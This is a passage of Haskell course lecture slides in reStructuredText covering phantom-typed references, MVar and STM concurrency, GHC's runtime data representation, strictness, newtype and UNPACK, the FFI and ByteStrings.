   curCfg <- readIORef cfgRef

The trouble is, ill-behaved code could clearly also *modify* the current
configuration, and leave us with a debugging nightmare.

Phantom types to the rescue!
============================

Let's create a new type of mutable reference.

We use a phantom type ``t`` to statically track whether a piece of code
is allowed to modify the reference or not.

.. code:: haskell

   import Data.IORef

   newtype Ref t a = Ref (IORef a)

Remember, our use of ``newtype`` here means that the ``Ref`` type only
exists at compile time: it imposes *no* runtime cost.

Since we are using a phantom type, we don't even need values of our
access control types:

.. code:: haskell

   data ReadOnly
   data ReadWrite

We're already in a good spot! Not only are we creating compiler-enforced
access control, but it will have *zero* runtime cost.

Creating a mutable reference
============================

To create a new reference, we just have to ensure that it has the right
type.

.. code:: haskell

   newRef :: a -> IO (Ref ReadWrite a)
   newRef a = Ref `fmap` newIORef a

Reading and writing a mutable reference
=======================================

Since we want to be able to read both read-only and read-write
references, we don't need to mention the access mode when writing a type
signature for ``readRef``.

.. code:: haskell

   readRef :: Ref t a -> IO a
   readRef (Ref ref) = readIORef ref

Of course, code can only write to a reference if the compiler can
statically prove (via the type system) that it has write access.

.. code:: haskell

   writeRef :: Ref ReadWrite a -> a -> IO ()
   writeRef (Ref ref) v = writeIORef ref v

Converting a reference to read-only
===================================

This function allows us to convert any kind of reference into a
read-only reference:

.. code:: haskell

   readOnly :: Ref t a -> Ref ReadOnly a
   readOnly (Ref ref) = Ref ref

In order to prevent clients from promoting a reference from read-only to
read-write, we do *not* provide a function that goes in the opposite
direction.

We also use the familiar technique of constructor hiding at the top of
our source file:

.. code:: haskell

   module Ref
       (
         Ref, -- export type ctor, but not value ctor
         newRef, readOnly,
         readRef, writeRef
       ) where

Further reading
===============

A *really* good read: 

-  `Data analysis with monoids <http://twdkz.wordpress.com/2013/05/31/data-analysis-with-monoids/>`__

Monoids for MapReduce: 

-  `Google‚Äôs MapReduce Programming Model---Revisited <http://userpages.uni-koblenz.de/~laemmel/MapReduce/paper.pdf>`__


/L6 Memory
===========

MVars revisited
===============

-  Exercise: Write transfer function to move money between accounts

   -  ``wget``
      ```cs240h.stanford.edu/transfer.hs`` <http://cs240h.scs.stanford.edu/transfer.hs>`__

   .. code:: haskell

      import Control.Concurrent
      import Control.Monad

      type Account = MVar Double

      transfer :: Double -> Account -> Account -> IO ()
      transfer amount from to = ???

   -  Should work atomically with multiple threads
   -  E.g., other threads should never see money in neither account or
      both accounts
   -  Don‚Äôt transfer money if insufficient funds in account

-  Example:

   ::

      *Main> :load "transfer.hs"
      Ok, modules loaded: Main.
      *Main> main
      9.0
      1.0

First attempt at solution
=========================

.. code:: haskell

   type Account = MVar Double

   transfer :: Double -> Account -> Account -> IO ()
   transfer amount from to =
     modifyMVar_ from $ \bf -> do
       when (bf < amount) $ fail "not enough money"
       modifyMVar_ to $ \bt -> return $! bt + amount
       return $! bf - amount

-  What‚Äôs wrong with the above code?

.. _first-attempt-at-solution-1:

First attempt at solution
=========================

.. code:: haskell

   type Account = MVar Double

   transfer :: Double -> Account -> Account -> IO ()
   transfer amount from to =
     modifyMVar_ from $ \bf -> do
       when (bf < amount) $ fail "not enough money"
       modifyMVar_ to $ \bt -> return $! bt + amount
       return $! bf - amount

-  What‚Äôs wrong with the above code?

   1. Can deadlock when simultaneously transferring money in both
      directions

      .. code:: haskell

         forkIO $ transfer 1 ac1 ac2
         forkIO $ transfer 1 ac2 ac1

   2. Throwing an exception when not enough money is ugly‚Ä¶ what if we
      just waited for enough money to show up before completing the
      transfer?

-  How would you fix #1?

Second attempt at solution
==========================

-  Strategy: Use non-blocking
   ```tryTakeMVar`` <http://www.haskell.org/ghc/docs/latest/html/libraries/base-4.7.0.0/Control-Concurrent-MVar.html#v:tryTakeMVar>`__
   for second ``MVar``

   -  If it fails, release both and try again in different order

.. code:: haskell

   transfer :: Double -> Account -> Account -> IO ()
   transfer amount from to = do
     let tryTransfer = modifyMVar from $  bf -> do
           when (bf < amount) $ fail "not enough money"
           mbt <- tryTakeMVar to
           case mbt of
             Just bt -> do putMVar to $! bt + amount
                           return (bf - amount, True)
             Nothing -> return (bf, False)
     ok <- tryTransfer
     unless ok $ safetransfer (- amount) to from

-  Is this gross enough for you yet?

   -  If not, make the code sleep when not enough funds are present in
      ``from``
   -  ‚Ä¶ or fix it to handle asynchronous exceptions properly

.. _software-transactional-memorystm:

`Software transactional memory <http://hackage.haskell.org/package/stm>`__
==========================================================================

-  What if instead we used database-like transactions?

   -  Read and write a bunch of variables
   -  Writes initially go to log, then get committed atomically at end
   -  Did you get an inconsistent view or clash with another update? No
      problem, just abort and retry the whole transaction

-  Would be hard to do in C or Java

   -  What if you wrote to the network or file system during
      transaction?
   -  ‚ÄúExternalized‚Äù actions can‚Äôt easily be rolled back

-  But in Haskell, the ``IO`` type (or lack thereof) can control side
   effects

-  Slides inspired by good write-up in `[Peyton
   Jones] <http://research.microsoft.com/en-us/um/people/simonpj/papers/stm/beautiful.pdf>`__

STM basics
==========

-  New variable type ``TVar a`` (kind of like an
   ```IORef a`` <http://www.haskell.org/ghc/docs/latest/html/libraries/base-4.7.0.0/Data-IORef.html>`__)

   -  Module
      ```Control.Concurrent.TVar`` <http://hackage.haskell.org/package/stm-2.4.3/docs/Control-Concurrent-STM-TVar.html>`__
      gives you

   .. code:: haskell

      newTVarIO   :: a -> IO (TVar a)
      readTVarIO  :: TVar a -> IO a

      readTVar    :: TVar a -> STM a
      writeTVar   :: TVar a -> a -> STM ()
      modifyTVar  :: TVar a -> (a -> a) -> STM ()  -- lazy
      modifyTVar' :: TVar a -> (a -> a) -> STM ()  -- strict

-  New ```STM``
   monad <http://hackage.haskell.org/package/stm-2.4.3/docs/Control-Monad-STM.html>`__
   allows ``TVar`` access but no irreversible side effects

   .. code:: haskell

      atomically :: STM a -> IO a

   -  ``atomically`` lets you run ``STM`` computations from ``IO``
   -  You get: semantics of one global lock + parallelism of
      fine-grained locks!
   -  In exchange, you give up the ability to perform externalized
      ``IO`` actions

STM Example
===========

.. code:: haskell

   type Account = TVar Double

   transfer :: Double -> Account -> Account -> STM ()
   transfer amount from to = do
     modifyTVar' from (subtract amount)
     modifyTVar' to (+ amount)

   main :: IO ()
   main = do
     ac1 <- newTVarIO 10
     ac2 <- newTVarIO 0
     atomically $ transfer 1 ac1 ac2

-  Note: ``subtract a b = b - a``

   -  Language wart: Unlike all other binary operators, can‚Äôt make
      section with ``(- a)`` because that‚Äôs unary negation (i.e.,
      ``0-a``)

-  What if you want to wait when not enough money in account?

Aborting
========

.. code:: haskell

   retry :: STM a
   orElse :: STM a -> STM a -> STM a

-  ``retry`` aborts the transaction

   -  But ``STM`` knows what ``TVar`` s code read to detect conflicts‚Ä¶
   -  Can sleep until some ``TVar`` code read changes w/o explicit
      condition variables

   .. code:: haskell

      transfer :: Double -> Account -> Account -> STM ()
      transfer amount from to = do
        bf <- readTVar from
        when (amount > bf) retry
        modifyTVar' from (subtract amount)
        modifyTVar' to (+ amount)

-  ``orElse`` tries second action if first one aborts (sleeps if both
   abort)

   .. code:: haskell

      transfer2 :: Double -> Account -> Account -> Account -> STM ()
      transfer2 amount from1 from2 to =
        atomically $ transferSTM amount from1 to
                     `orElse` transferSTM amount from2 to

   -  Effectively provides nested transactions

Enforcing invariants
====================

.. code:: haskell

   alwaysSucceeds :: STM a -> STM ()

-  ``alwaysSucceeds`` adds invariant to check after every transaction
   (Either the invariant throws an exception or its return value
   ignored)

-  Example: say you are paranoid about negative account balances

.. code:: haskell

   newAccount :: Double -> STM Account
   newAccount balance = do
     tv <- newTVar balance
     alwaysSucceeds $ do balance <- readTVar tv
                         when (balance < 0) $ fail "negative balance"
     return tv

   bogus :: IO ()
   bogus = do
     ac <- atomically $ newAccount 10
     atomically $ modifyTVar ac (subtract 15)

-  Will catch errors immediately at end of & roll back faulty
   transactions

::

   *Main> bogus
   *** Exception: negative balance

Switching gears‚Ä¶
================

-  Let‚Äôs get back to pure functional code

-  How does the compiler represent data in memory?

Na√Øve Haskell data representation
=================================

-  A value requires a constructor, plus arguments

   -  At runtime, need to determine a value‚Äôs constructor, but not it‚Äôs
      type (Compiler already type-checked program, so no runtime type
      checks)

   .. code:: c

      struct Val {
        unsigned long constrno; /* constructor # */
        struct Val *args[];     /* flexible array */
      };

   -  For a type like ``[Int]``, ``constrno`` might be 0 for ``[]`` and
      1 for ``(:)``, where ``[]`` has 0-sized ``args`` and ``(:)`` has
      2-element ``args``
   -  For a type like ``Int``, ``constrno`` can be the actual integer,
      with no ``args``
   -  For a single-constructor type (e.g., ``Point``) ``constrno`` not
      used

-  Problems with our approach so far

   -  No way to represent exceptions or thunks
   -  Garbage collector needs to know how many elements are in ``args``
   -  Small values such as ``Int`` s always require chasing a pointer

Add level of indirection to describe values
===========================================

.. code:: c

   typedef struct Val {
     const struct ValInfo *info;
     struct Val *args[];
   } Val;

   /* Statically allocated at compile time.  Only one per
    * constructor (or closure-creating expression, etc.) */
   struct ValInfo {
     struct GCInfo gcInfo;  /* for garbage collector */
     enum { CONSTRNO, FUNC, THUNK, IND } tag;
     union {
       unsigned int constrno;
       Val *(*func) (const Val *closure, const Val *arg);
       Exception *(*thunk) (Val *closure);
     };
   };

-  ``gcInfo`` says how many ``Val *`` s are in ``args`` and where they
   are
-  ``tag == CONSTRNO`` means ``constrno`` valid, used as on last slide
-  ``tag == IND`` means ``args[0]`` is an indirect *forwarding pointer*
   to another ``Val`` and union is unused; useful if size of ``args``
   grows

Function values
===============

-  A ``Val`` whose ``ValInfo`` has ``tag == FUNC`` uses the ``func``
   field

   .. code:: c

          Val *(*func) (const Val *closure, const Val *arg);

-  To apply function ``f`` to argument ``a`` (where both are type
   ``Val *``):

   .. code:: c

              f->info->func (f, a);

-  Note that ``func`` ‚Äôs first argument (``closure``) is the function
   ``Val`` itself

   -  Provides a *closure* environment so ``ValInfo``/``func`` can be
      re-used

-  ``func`` ‚Äôs second argument (``arg``) is the argument ``a`` on which
   the function is being evaluated

-  Assume all functions take one argument

   -  Logically this is fine since we have currying
   -  For performance, real compilers must optimize multi-argument case

Closures
========

-  Top-level bindings don‚Äôt need the ``closure`` argument to ``func``

   .. code:: haskell

      addOne :: Int -> Int
      addOne x = x + 1

   -  The ``Val`` for function ``addOne`` can have zero-length ``args``

-  Local bindings may need environment values in ``closure``

   .. code:: haskell

      add :: Int -> (Int -> Int)
      add n = \m -> addn m
          where addn m = n + m

   -  Compiler will only emit code for local function ``addn`` once
   -  But logically, there is a separate ``addn`` function (with a
      different ``n``) for each invocation of ``add``
   -  So each ``addn`` instance is a different ``Val``, but all share
      the same ``ValInfo``
   -  Use ``args[0]`` in each ``Val`` to specify the value of ``n``

Thunk values
============

-  A ``Val`` with ``tag == THUNK`` uses the ``thunk`` field in
   ``ValInfo``

   .. code:: c

          Exception *(*thunk) (Val *closure);

   -  *Updates* ``v`` (turns it into non-thunk) or returns a
      non-``NULL`` ``Exception *``

-  To evaluate a thunk:

   .. code:: c

              v->info->thunk (v);

-  Two big differences between thunks and functions

   -  A function takes an argument, while a thunk does not
   -  A function value is immutable, while a thunk updates itself

-  Note also that a thunk may throw an exception

   -  Functions can, too, but for simplicity let‚Äôs implement it by
      having the function return a thunk that throws an exception

Forcing
=======

-  Turning a thunk into a non-thunk is known as *forcing* it

-  What if a thunk‚Äôs return value doesn‚Äôt fit in thunk‚Äôs ``args``?

   -  This is why we have the ``IND`` ``ValInfo`` tag‚ÄìAllocate new
      ``Val``, place indirect forwarding pointer in old ``Val``

-  A possible implementation of forcing that walks ``IND`` pointers:

   .. code:: c

      Exception *force (Val **vp)
      {
        for (;;) {
          if ((*vp)->info->tag == IND)
            *vp = (*vp)->arg[0];
          else if ((*vp)->info->tag == THUNK) {
            Exception *e = (*vp)->info->thunk (*vp);
            if (e)
              return e;
          }
          else
            return NULL;
        }
      }

Currying
========

-  Let‚Äôs use simple implementation of currying (GHC very complex)

-  Set ``closure->args`` to head of list of previously curried args

   .. code:: haskell

      const3 :: a -> b -> c -> a
      const3 a b c = a

   -  Compiler emits 3 ``ValInfo`` s and 3 functions for ``const3``
   -  Top-level binding‚Äôs ``ValInfo`` has ``func = const3_1``
   -  ``const3_1`` creates ``Val v1`` where ``arg[0]`` is first argument
      (``a``) and ``info->func = const3_2``
   -  ``const3_2`` creates a ``Val v2`` where ``arg[0]`` is the second
      argument (``b``), ``arg[1]`` is ``v1``, and ``info->func`` is
      ``const3_3``
   -  ``const3_3`` has access to all arguments and actually implements
      ``const3``

-  Shared arguments have common arg tails, only evaluated once

   .. code:: haskell

          let f = const3 (superExpensive 5) -- v1, evaluated once
          in (f 1 2, f 3 4)

Code for currying example
=========================

.. code:: haskell

   const3 :: a -> b -> c -> a
   const3 a b c = a

.. code:: c

   Val *const3_1 (Val *ignored, Val *a)
   {
     v = (Val *) gc_malloc (offsetof (Val, args[1]));
     v->info = &const3_2_info;  /* func = const3_2 */
     v->args[0] = a;
     return v;
   }

   Val *const3_2 (Val *closure, Val *b)
   {
     v = (Val *) gc_malloc (offsetof (Val, args[2]));
     v->info = &const3_3_info;  /* func = const3_3 */
     v->args[0] = b;
     v->args[1] = closure;
     return v;
   }

   Val *const3_3 (Val *v, Val *c)
   {
     return v->args[1]->args[0];
   }

Unboxed types
=============

-  Unfortunately, now ``Int`` has even more overhead

   -  To use, must check ``i->info->tag`` then access
      ``i->info->constr``
   -  Moreover, each number needs a distinct ``ValInfo`` structure (but
      ``ValInfo`` s statically allocated‚Äìhow do you know what numbers
      the program will need)

-  Idea: Have special *unboxed* types that don‚Äôt use ``struct Val``

   .. code:: c

      union Arg {
        struct Val *boxed;     /* most values are boxed */
        unsigned long unboxed; /* "primitive" values */
      };

      typedef struct Val {
        const struct ValInfo *info;
        union Arg args[];      /* args can be boxed or unboxed */
      } Val;

   -  Unboxed types have no constructor and cannot be thunks (no
      ``ValInfo``)
   -  Can fit in a single register or take the place of a ``Val *`` arg
   -  Must extend ``GCInfo`` to identify which args are and are not
      boxed

Unboxed types in GHC
====================

-  GHC exposes unboxed types (even though not part of Haskell)

   -  Symbols use ``#`` character‚Äìmust enable with
      ```-XMagicHash`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/syntax-extns.html#magic-hash>`__
      option
   -  Have unboxed types (``Int#``) and primitive operations on them
      (``+#``)
   -  See
      `GHC.Prim <http://www.haskell.org/ghc/docs/latest/html/libraries/ghc-prim-0.3.1.0/GHC-Prim.html>`__
      or type ‚Äú``:browse GHC.Prim``‚Äù in GHCI
   -  Also have `unboxed
      constants <http://www.haskell.org/ghc/docs/latest/html/users_guide/syntax-extns.html#magic-hash>`__‚Äì``2#``,
      ``'a'#``, ``2##`` (unsigned), ``2.0##``

-  What is ``Int`` really?

   -  Single-constructor data type, with a single, unboxed argument

   ::

      Prelude> :set -XMagicHash
      Prelude> :m +GHC.Types GHC.Prim
      Prelude GHC.Types GHC.Prim> :i Int
      data Int = I# Int#      -- Defined in GHC.Types
      ...
      Prelude GHC.Types GHC.Prim> case 1 of I# u -> I# (u +# 2#)
      3

   -  Lets ``Int`` contain thunk, but avoids pointer dereference once
      evaluated

Restrictions on unboxed types
=============================

-  Cannot instantiate type variables with unboxed types

   .. code:: haskell

      {-# LANGUAGE MagicHash #-}
      import GHC.Prim

      data FastPoint = FastPoint Double# Double#  -- ok
      fp = FastPoint 2.0## 2.0##                  -- ok

      -- Error: can't pass unboxed type to polymorphic function
      fp' = FastPoint 2.0## (id 2.0##)

      -- Error: can't use unboxed type as type parameter
      noInt :: Maybe Int#
      noInt = Nothing

-  Enforced by making unboxed types a different kind of type

   ::

      Prelude GHC.Types GHC.Prim> :kind Int#
      Int# :: #

   -  Recall type variables have kinds with stars (‚àó, ‚àó ‚Üí ‚àó, etc.),
      never ``#``

   -  Polymorphism works because all types of kind ‚àó represented as
      ``Val *``

``seq`` revisited
=================

-  Recall ``seq :: a -> b -> b``

   -  If ``seq a b`` is forced, then first ``a`` is forced, then ``b``
      is forced and returned

-  Consider the following code (similar to concurrency lecture):

   .. code:: haskell

      infiniteLoop = infiniteLoop :: Char   -- loops forever

      seqTest1 = infiniteLoop `seq` "Hello" -- loops forever

      seqTest2 = str `seq` length str       -- returns 6
          where str = infiniteLoop:"Hello"

   -  ``seqTest1`` hangs forever, while ``seqTest2`` happily returns 6

-  ``seq`` only forces a ``Val``, not the ``arg`` fields of the ``Val``

   -  ``seqTest2`` ‚Äôs ``seq`` forces ``str`` ‚Äôs constructor ``(:)``,
      but not the head or tail
   -  This is known as putting ``str`` in *Weak Head Normal Form* (WHNF)
   -  Can‚Äôt fully evaluate an arbitrary data type (but see
      `Control.DeepSeq <http://hackage.haskell.org/packages/archive/deepseq/latest/doc/html/Control-DeepSeq.html>`__)

Example: hypothetical ``seq`` implementation
============================================

.. code:: c

   const struct ValInfo seq_info = {
     some_gcinfo, THUNK, .thunk = &seq_thunk
   };

   Val *seq_2 (Val *closure, Val *b)
   { /* assume seq_1 put first arg of (seq a b) in closure */
     c = (Val *) gc_malloc (offsetof (Val, args[2]));
     c->info = &seq_info;
     c->args[0] = closure->args[0];
     c->args[1] = b;
     return c;
   }

   Exception *seq_thunk (Void *c)
   {
     Exception *e = force (&c->args[0]);
     if (!e) {
       c->info = &ind_info;     /* ValInfo with tag = IND */
       c->args[0] = c->args[1]; /* forward to b */
     }
     return e;
   }

Strictness revisited
====================

-  Recall strictness flag on fields in data declarations

   .. code:: haskell

      data IntWrapper = IntWrapper !Int

   -  ``Int`` has ``!`` before it, meaning it must be strict
   -  Strict means the ``Int`` ‚Äôs ``ValInfo`` cannot have ``tag``
      ``THUNK`` or ``IND``

-  Accessing a strict ``Int`` touches only one cache line

   -  Recall ``data Int = I# Int#`` has only one constructor

   -  Plus strict flag means ``tag == CONSTRNO``, so know what‚Äôs in
      ``ValInfo``

   -  Plus ``Int#`` is unboxed

   -  Thus, once ``IntWrapper`` forced, immediately safe to access
      ``Int`` as

      .. code:: c

             myIntWrapper.arg[0].boxed->arg[0].unboxed

Semantic effects of strictness
==============================

-  Strictness is primarily used for optimization

   -  To avoid building up long chains of thunks
   -  To save overhead of checking whether thunk evaluated

-  But has semantic effects: A non-strict ``Int`` is not just a number

   -  Can also throw an exception or loop forever when evaluated
   -  Such behavior can be modeled as a special value :math:`\bot`
      (‚Äúbottom‚Äù)
   -  So the values of ``Int`` are :math:`\{0,1\}^{64} \cup \{\bot\}`
   -  Types that include value :math:`\bot` are called *lifted*

-  Note 1: an unboxed type is necessarily unlifted

-  Note 2: ``!Int`` not a first-class type, only valid for ``data``
   fields

   .. code:: haskell

      data SMaybe a = SJust !a | SNothing   -- ok, data field
      strictAdd :: !Int -> !Int -> !Int     -- error
      type StrictMaybeInt = Maybe !Int      -- error

``case`` statements revisited
=============================

-  ``case`` statement pattern matching can force thunks

   -  An *irrefutable* pattern is one that always matches
   -  A pattern consisting of a single variable or ``_`` is irrefutable
   -  Any non-irrefutable pattern forces evaluation of the argument
   -  Matching happens top-to-bottom, and left-to-right within
      alternatives

-  Function pattern matching is the same as (desuggared into) ``case``

   -  Recall ``undefined :: a`` is ``Prelude`` symbol with value
      :math:`\bot`

   .. code:: haskell

      f ('a':'b':rest) = rest
      f _              = "ok"
      test1 = f (undefined:[])   -- error
      test2 = f ('a':undefined)  -- error
      test3 = f ('x':undefined)  -- "ok" (didn't force tail)

-  Adding ``~`` before a pattern makes it irrefutable

   .. code:: haskell

      three = ( ~(h:t) -> 3) undefined  -- evaluates to 3

``newtype`` declarations
========================

-  We‚Äôve seen two ways to introduce new types

   -  ``data`` ‚Äì creates a new (boxed) type, adding overhead of a
      ``Val`` wrapper
   -  ``type`` ‚Äì creates an alias for an existing type, with no overhead

-  Sometimes you want a new type implemented by an existing type

   -  E.g., might want ``Meters``, ``Seconds``, ``Grams``, all
      implemented by ``Double``
   -  Using ``type`` would make them all synonymous, facilitating errors
   -  Might want different instances of ``Show`` for each, impossible
      with ``type``
   -  Could say ``data Meters = Meters Double`` ‚Äì but will add overhead

-  The ``newtype`` keyword introduces new type with no overhead

   -  Use just like ``data``, but limited to one constructor and one
      field
   -  This is possible because all type-checking is compile-time

``newtype`` semantics
=====================

-  What‚Äôs the semantic difference between these two declarations?

   .. code:: haskell

      newtype NTInt = NTInt Int deriving (Show)

   .. code:: haskell

      data SInt = SInt !Int deriving (Show)

-  Exercise: Suppose you have

   .. code:: haskell

      uNTInt = NTInt undefined
      uSInt = SInt undefined

   Write code that behaves differently for ``uNTInt`` vs. ``uSInt``

.. _newtype-semantics-1:

``newtype`` semantics
=====================

-  What‚Äôs the semantic difference between these two declarations?

   .. code:: haskell

      newtype NTInt = NTInt Int deriving (Show)

   .. code:: haskell

      data SInt = SInt !Int deriving (Show)

-  The ``NTInt`` constructor is a ‚Äúfake‚Äù compile-time-only construct

   -  A case statement deconstructing a ``newtype`` compiles to nothing

   .. code:: haskell

      newtype NTInt = NTInt Int deriving (Show)
      uNTInt = NTInt undefined
      testNT = case uNTInt of NTInt _ -> True   -- returns True

   -  Conversely, forcing a value (by matching constructor) forces
      strict fields

   .. code:: haskell

      data SInt = SInt !Int deriving (Show)
      uSInt = SInt undefined
      testS = case uSInt of SInt _ -> True      -- undefined

.. _the-unpackunpack-pragma:

The UNPACK pragma
=================

http://www.haskell.org/ghc/docs/latest/html/users_guide/pragmas.html#unpack-pragma

-  ``newtype`` almost always better than ``data`` when it applies

-  What about a multi-field data type?

   .. code:: haskell

      data TwoInts = TwoInts !Int !Int

   -  Fields are strict, we know they‚Äôll have ``CONSTRNO`` ``ValInfo``

   -  Why not stick the ``Int#`` s directly into the ``args`` of a
      ``TwoInts`` ``Val``?

   -  GHC provides an ``UNPACK`` pragma to do just this

      .. code:: haskell

         data TwoInts = TwoInts {-# UNPACK #-} !Int {-# UNPACK #-} !Int

   -  Works for any strict field with a single-constructor datatype

-  Unlike ``newtype``, ``UNPACK`` is not always a win

   -  If you pass field as argument, will need to re-box it

-  ``-funbox-strict-fields`` flag unpacks *all* strict fields

.. raw:: html

   <!--


   # User-managed memory

   * Opaque type [`Ptr a`][Ptr] represents pointers to type `a`
       * Pointers are not typesafe--allow pointer arithmetic and casting

           ~~~~ {.haskell}
           nullPtr :: Ptr a
           plusPtr :: Ptr a -> Int -> Ptr b
           minusPtr :: Ptr a -> Ptr b -> Int
           castPtr :: Ptr a -> Ptr b
           ~~~~

       * Pointer arithmetic is always in units of bytes (unlike in C,
         where unit is size of the pointed-to object)
   * Class [`Storable`][Storable] provides raw access to memory using
     `Ptr`s

       ~~~~ {.haskell}
       class Storable a where
           sizeOf :: a -> Int
           alignment :: a -> Int
           peek :: Ptr a -> IO a
           poke :: Ptr a -> a -> IO ()
           ...
       ~~~~

       * Most basic types (`Bool`, `Int`, `Char`, `Ptr a`, etc.) are `Storable`

   # `alloca`

   * Easiest way to get a valid `Ptr` is `alloca`:

       ~~~~ {.haskell}
       alloca :: Storable a => (Ptr a -> IO b) -> IO b
       ~~~~

       * Allocates enough space for an object of type `a`
       * Calls function with a `Ptr` to the space
       * Reclaims the memory when the function returns (much like C
         `alloca`)
       * Can also ask for a specific number of bytes:

       ~~~~ {.haskell}
       allocaBytes :: Int -> (Ptr a -> IO b) -> IO b
       ~~~~

   * `Foreign` module provides handy [`with`][with] utility

       ~~~~ {.haskell}
       with :: Storable a => a -> (Ptr a -> IO b) -> IO b
       with val f  =
         alloca $ \ptr -> do
           poke ptr val
           res <- f ptr
           return res
       ~~~~


   # More `Storable` types

   * `Foreign.C` contains wrappers for C types
       * `CInt`, `CUInt`, `CChar`, `CDouble`, `CIntPtr` etc.
   * `Data.Int` and `Data.Word` have all sizes of machine integer
       * `Int8`, `Int16`, `Int32`, `Int64` -- signed integers
       * `Word8`, `Word16`, `Word32`, `Word64` -- unsigned integers

   * Example: extract all the bytes from a `Storable` object

       ~~~~ {.haskell}
       toBytes :: (Storable a) => a -> [Word8]
       toBytes a = unsafePerformIO $
           with a $ \pa -> go (castPtr pa) (pa `plusPtr` sizeOf a)
           where go p e | p < e = do b <- peek p
                                     bs <- go (p `plusPtr` 1) e
                                     return (b:bs)
                        | otherwise = return []
       ~~~~

       * `unsafePerformIO` might be okay here since `toBytes` pure
       * Notice how `plusPtr` lets us change from `Ptr a` to `Ptr Word8`

   # `malloc` and `mallocForeignPtr`

   * Can also allocate longer-lived memory with `malloc`

       ~~~~ {.haskell}
       malloc :: Storable a => IO (Ptr a)
       mallocBytes :: Int -> IO (Ptr a)
       free :: Ptr a -> IO ()
       realloc :: Storable b => Ptr a -> IO (Ptr b)
       reallocBytes :: Ptr a -> Int -> IO (Ptr a)
       ~~~~

       * Disadvantage:  bad programming can lead to memory
         leaks/corruption

   * `ForeignPtr` lets you delegate deallocation to garbage collector

       ~~~~ {.haskell}
       mallocForeignPtr :: Storable a => IO (ForeignPtr a)
       mallocForeignPtrBytes :: Int -> IO (ForeignPtr a)
       ~~~~

   # Working with `ForeignPtr`s

   * To use `ForeignPtr`, must convert it to `Ptr`
       * Problem: How does GC know `ForeignPtr` in scope when using
         `Ptr`?
       * Solution: use `Ptr` within function that keeps reference to
         `ForeignPtr`

       ~~~~ {.haskell}
       withForeignPtr :: ForeignPtr a -> (Ptr a -> IO b) -> IO b
       ~~~~

   * Can also convert `Ptr`s to `ForeignPtr`s

       ~~~~ {.haskell}
       type FinalizerPtr a = FunPtr (Ptr a -> IO ())
       newForeignPtr :: FinalizerPtr a -> Ptr a
                     -> IO (ForeignPtr a)
       newForeignPtr_ :: Ptr a -> IO (ForeignPtr a)
       addForeignPtrFinalizer :: FinalizerPtr a -> ForeignPtr a
                              -> IO ()
       ~~~~

       * Can add multiple finalizers, will run in reverse order
   * Note use of `FunPtr` -- this is type wrapper for C function pointer
       * Need foreign function interface to create these
       * [`finalizerFree`][finalizerFree] symbol conveniently provides
         function pointer for `free`

   # [Foreign function interface][FFI] (FFI)

   * Can import foreign functions like this:

       ~~~~ {.haskell}
       foreign import ccall unsafe "stdlib.h malloc"
           c_malloc :: CSize -> IO (Ptr a)
       foreign import ccall unsafe "stdlib.h free"
           c_free :: Ptr a -> IO ()
       ~~~~

       * `ccall` says use C calling convention (also `cplusplus` and few
         others)
       * `unsafe` promises the C function will not call back into
         Haskell
       * `unafe` faster than `safe`, but gives undefined results if call
         triggers GC
   * Spec for import string: `"`[`static`] [*c-header*] [`&`][*c-name*]`"`
       * `static` required only if *c-name* is `dynamic` or `wrapper`
       * *c-header* is a single `.h` file with the declaration
          (ignored by GHC)
       * '&' imports pointer rather than function (required for `FunPtr`s)


   # FFI types

   * FFI function arguments must be *basic foreign types*
       * `Char`, `Int`, `Double`, `Float`, `Bool`, `Int8`, `Int16`,
         `Int32`, `Int64`, `Word8`, `Word16`, `Word32`, `Word64`, `Ptr`
         `a`, `FunPtr a`, and `StablePtr a`
       * Also accepts any `type` or `newtype` wrappers for basic types
         (`CInt`, `CChar`, etc.)<br/>
         [Documentation incorrectly says `data CInt`, but `:i` in GHCI
         reveals truth.]
   * FFI function results can be
       * Any valid argument type
       * `()` (for functions returning `void`)
       * `IO a` where `a` is either of the above two
   * Place result `IO` if function has side effects or non-determinism
       * Okay to omit if it is a pure C function:

           ~~~~ {.haskell}
           foreign import ccall unsafe "arpa/inet.h ntohl"
               ntohl :: Word32 -> Word32
           ~~~~

       * Haskell can't check C purity, so omitting `IO` can cause
         problems

   # [`hsc2hs`][hsc2hs]

   * How to access C data structures?

       ~~~~ {.c}
       struct mystruct {
         char *name;
         int value;
       };
       ~~~~

       * Might model with opaque placeholder type

       ~~~~ {.haskell}
       data MyStruct        -- no constructors, just a placeholder
       getValue :: Ptr MyStruct -> IO CInt
       getValue ptr = peek $ ptr `plusPtr` 8  -- assumes char * 8 bytes
       ~~~~

   * [`hsc2hs`][hsc2hs] is pre-processor that lets you compute C values

       ~~~~ {.haskell}
       #include "myheader.h"
       getValue ptr = peek $ ptr `plusPtr`
                      #{offset struct mystruct, value}
       ~~~~

       * Super-simple implementation just uses C macros & `printf`
       * Find the file [`template-hsc.h`][template-hsc.h] on your system
         to see defs of `#` commands
       * Can also define your own macros with `#let` (like `#define` w/o
         parens)

   -->

.. _bytestringsbytestring:

ByteStrings
==============

-  Haskell ``String`` s obviously not very efficient

-  Strict ``ByteString`` s efficiently manipulate raw bytes

   .. code:: haskell

      import qualified Data.ByteString as S
      import qualified Data.ByteString.Char8 as S8

   -  Implements a similar interface to lists: ``S.head``, ``S.tail``,
      ``S.length``, ``S.foldl``, ``S.cons`` (like ``:``), ``S.empty``
      (like ``[]``), ``S.hPut`` (like ``hPutStr``), ``S.readFile``
   -  Must import qualified to avoid name clashes
   -  ``S.pack`` and ``S.unpack`` translate to/from ``[Word8]``
   -  ``S8`` has same functions as ``S``, but uses ``Char`` instead of
      ``Word8``‚Äìmeans you lose upper bits of ``Char`` (use
      ```toString`` <http://hackage.haskell.org/packages/archive/utf8-string/0.3.7/doc/html/Data-ByteString-UTF8.html#v:toString>`__
      from
      `utf8-string <http://hackage.haskell.org/package/utf8-string>`__
      to avoid loss)

-  Implementation

   .. code:: haskell

      data ByteString = PS {-# UNPACK #-} !(ForeignPtr Word8)
                           {-# UNPACK #-} !Int  -- offset
                           {-# UNPACK #-} !Int  -- length

.. _lazy-bytestringsbytestring.lazy:

Lazy ByteStrings
=================

-  Same package implements `lazy
   ``ByteString`` s <http://www.haskell.org/ghc/docs/latest/html/libraries/bytestring-0.10.4.0/Data-ByteString-Lazy.html>`__

   .. code:: haskell

      import qualified Data.ByteString.Lazy as L
      import qualified Data.ByteString.Lazy.Char8 as L8

   -  Provides mostly the same functions as strict ``ByteString``
      modules

-  Confusing that both modules use same names for many things

   -  Important to look at import qualifications to understand code
   -  Worse: documentation does not qualify symbol names Tip: **hover
      your mouse over symbol and look at URL to figure out module**
